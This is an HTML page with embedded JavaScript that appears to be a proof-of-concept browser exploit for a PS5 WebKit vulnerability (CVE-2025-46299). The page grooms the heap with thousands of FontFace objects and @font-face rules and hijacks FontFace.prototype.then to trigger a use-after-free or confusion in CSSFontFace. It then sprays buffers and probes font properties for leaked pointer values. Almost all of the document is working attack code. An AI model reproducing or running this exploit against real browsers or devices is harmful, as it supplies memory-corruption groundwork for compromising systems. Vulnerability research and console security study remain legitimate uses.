<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-46299 Probe – Memory Init Leak Test</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<div id="out" style="font-family:monospace;white-space:pre-wrap;padding:10px;color:#0f0;background:#000;"></div>
<script>
"use strict";

// ---------- LOGGING ----------
const O = document.getElementById('out');
function log(msg, color) {
    console.log(msg);
    const span = document.createElement('span');
    if (color) span.style.color = color;
    span.textContent = msg + '\n';
    O.appendChild(span);
    O.scrollTop = O.scrollHeight;
}
function ok(m)  { log('  ✅ ' + m, '#0f0'); }
function fl(m)  { log('  ✘ ' + m, '#f00'); }
function star(m) { log('  ★ ' + m + ' ★', '#ff0'); }
function section(t) { log('\n--- ' + t + ' ---', '#fff'); }

// ---------- FONT BINARY ----------
const FB = 'd09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt';
const FBb = (() => { const s = atob(FB), b = new Uint8Array(s.length); for (let i=0;i<s.length;i++) b[i]=s.charCodeAt(i); return b; })();
function mkBuf() { return new Uint8Array(FBb).buffer; }
function fs() { void document.body.offsetTop; }

// ---------- CSSFONTFACE CONFUSION SETUP ----------
section('Setting up CSSFontFace confusion');
const sh = document.getElementById('s').sheet;
const keep = [], holes = [];
let trigger = null, uafOk = false;

// Standard grooming (same as v46)
for (let i=0; i<4096; i++) {
    try {
        const f = new FontFace('h_'+i, mkBuf(), {
            unicodeRange: 'U+E1'+(i%16).toString(16),
            style: i%2?'italic':'normal',
            weight: String(100+(i%9)*100)
        });
        document.fonts.add(f); holes.push(f);
    } catch(e) {}
}
fs();
for (let i=1; i<holes.length; i+=2) try { document.fonts.delete(holes[i]); } catch(e) {}
fs();
trigger = new FontFace('trigger', 'local(Helvetica)', { unicodeRange:'U+0041' });
document.fonts.add(trigger); void trigger.loaded;
for (let i=0; i<48; i++) try { sh.insertRule('@font-face{font-family:pad'+i+';src:url(np'+i+'.woff);unicode-range:U+E000}', sh.cssRules.length); } catch(e) {}
fs();
const fst = document.createElement('style'); document.head.appendChild(fst);
const fsh = fst.sheet;
for (let i=0; i<768; i++) try { fsh.insertRule('@font-face{font-family:fl'+i+';src:url(nf'+i+'.woff);unicode-range:U+E000}', fsh.cssRules.length); } catch(e) {}
fs();

// UAF trigger override
Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
        if (this === trigger && !uafOk) {
            uafOk = true;
            try {
                const ck = new FontFace('ck','local(Helvetica)',{unicodeRange:'U+E124'});
                document.fonts.add(ck); keep.push(ck);
                sh.deleteRule(1); fs();
                while (fsh.cssRules.length) try { fsh.deleteRule(0); } catch(e) {}
                fs();
                for (let i=0; i<holes.length; i+=4) try { document.fonts.delete(holes[i]); } catch(e) {}
                fs();
            } catch(e) {}
            for (let i=0; i<4; i++) { const t=[]; for (let j=0; j<128; j++) t.push(new ArrayBuffer(8192)); }
            for (let i=0; i<2048; i++) {
                try { sh.insertRule('@font-face{font-family:A_'+i+';src:local(Courier);font-weight:'+(100+(i%9)*100)+';font-style:'+(i%2?'italic':'normal')+';unicode-range:U+0042}', sh.cssRules.length); } catch(e) {}
            }
            fs();
            try {
                const d = document.createElement('div'); d.textContent='AB';
                d.style.cssText='position:absolute;left:-9999px;font:64px trigger;';
                document.body.appendChild(d); void d.offsetWidth;
            } catch(e) {}
        }
        return undefined;
    }
});
ok('Confusion setup complete');

// ---------- MEMORY INIT PROBE LOGIC ----------
section('Memory Initialisation Probe');
function isSuspicious(val, expected) {
    // Look for pointer-like patterns or high entropy
    const s = String(val);
    if (s.length === 0) return false;
    // Hex patterns like 0x...
    if (/\b0x[0-9a-fA-F]{6,16}\b/.test(s)) return true;
    // Long numeric strings that differ completely from expected
    if (/^[0-9]+$/.test(s) && s.length > 10 && String(expected) !== s) return true;
    // If expected is a short string but we got something very long (possible leak)
    if (typeof expected === 'string' && expected.length < 10 && s.length > 20) return true;
    return false;
}

function probeFontFace(face, label) {
    const props = [
        'family', 'style', 'weight', 'stretch', 'unicodeRange',
        'featureSettings', 'display', 'status'
    ];
    for (const prop of props) {
        try {
            const val = face[prop];
            const expected = face[prop]; // reading twice might expose changes
            if (isSuspicious(val, expected)) {
                log(`  ⚡ SUSPICIOUS ${label}.${prop} = ${val} (expected: ${expected})`, '#ff0');
            }
        } catch(e) {}
    }
}

// ---------- PHASE 1: Test fresh FontFace objects with complex descriptors ----------
log('Creating test FontFaces with edge-case descriptors...');
const testDescriptors = [
    { weight: '100', style: 'normal', unicodeRange: 'U+0041-005A' },
    { weight: '900', style: 'italic', unicodeRange: 'U+0000-FFFF' },
    { weight: '1', style: 'oblique 10deg', unicodeRange: 'U+20A0-20CF' },
    { weight: '1000', style: 'oblique -90deg', unicodeRange: 'U+E0000-E007F' },
    { stretch: 'ultra-condensed', unicodeRange: 'U+???' }, // invalid
    { featureSettings: '"kern" 1, "liga" 0', unicodeRange: 'U+0042' },
    { display: 'optional' }
];
const testFaces = [];
for (const desc of testDescriptors) {
    try {
        const f = new FontFace('test_'+Math.random(), 'local(Courier)', desc);
        document.fonts.add(f);
        testFaces.push(f);
    } catch(e) {}
}
fs();
log('Reading back immediately...');
for (const face of testFaces) probeFontFace(face, 'Fresh');
// Force GC if possible
try { if (typeof GCController !== 'undefined') GCController.collect(); } catch(e) {}
log('After GC...');
for (const face of testFaces) probeFontFace(face, 'AfterGC');

// ---------- PHASE 2: Use CSSFontFace confusion to check internal state ----------
log('Loading mixed fonts to trigger confusion...');
document.fonts.load('1em trigger, x', 'AB').then(function(faces) {
    let confusedFace = null;
    for (const f of faces) {
        if (f.family && f.family.startsWith('A_')) { confusedFace = f; break; }
    }
    if (!confusedFace) { fl('No confusion – cannot probe'); return; }
    star('Confusion active, probing confused FontFace...');
    probeFontFace(confusedFace, 'Confused');

    // Also probe the original trigger face for comparison
    const triggerFace = faces[0];
    probeFontFace(triggerFace, 'Trigger');
    ok('Memory init probe complete – check console for suspicious values');
}).catch(e => fl('load failed: '+e));
</script>
</body>
</html>
